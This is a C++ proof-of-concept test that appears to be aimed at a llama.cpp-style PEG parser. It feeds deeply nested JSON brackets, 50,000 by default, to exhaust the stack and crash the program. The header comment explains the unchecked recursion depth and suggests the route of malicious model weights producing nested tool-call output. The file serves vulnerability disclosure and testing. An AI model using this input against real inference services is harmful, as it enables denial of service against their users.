// Test: PEG parser stack overflow DoS via deeply-nested recursive input
//
// The PEG parser (common/peg-parser.cpp) recurses via arena.parse() for
// sequence, choice, repetition, tag, rule, ref, atomic, gbnf, ac, schema,
// and/not parsers. parse_depth is tracked but NEVER checked against a limit.
// A recursive grammar (e.g. JSON) parsing deeply-nested input will recurse
// once per nesting level, exhausting the stack -> crash (DoS).
//
// The JSON grammar is reachable from common_chat_parse via tool-call parsers
// built from chat templates (json_object / json_value rules). Model output
// (attacker-controlled via malicious GGUF weights) can be deeply nested JSON.

#include <variant>
#include <vector>
#include <string>
#include <map>
#include <set>
#include <memory>
#include <unordered_map>
#include <functional>
#include <stdexcept>
#include "peg-parser.h"
#include "chat-peg-parser.h"
#include "nlohmann/json.hpp"
#include <cstdio>
#include <cstdlib>
#include <string>

int main(int argc, char ** argv) {
    int depth = argc > 1 ? atoi(argv[1]) : 50000;

    // Build a recursive JSON parser using the builder.
    common_peg_arena arena = build_peg_parser([](common_peg_parser_builder & p) {
        return p.json();
    });

    // Feed deeply nested array input: [[[[...]]]]
    std::string input;
    for (int i = 0; i < depth; i++) input += '[';
    for (int i = 0; i < depth; i++) input += ']';

    printf("Parsing nested input of depth %d (total len %zu)...\n", depth, input.size());
    common_peg_parse_context ctx(input, COMMON_PEG_PARSE_FLAG_NONE);
    auto result = arena.parse(ctx);
    printf("Parse result type=%s start=%zu end=%zu\n",
           common_peg_parse_result_type_name(result.type), result.start, result.end);
    return 0;
}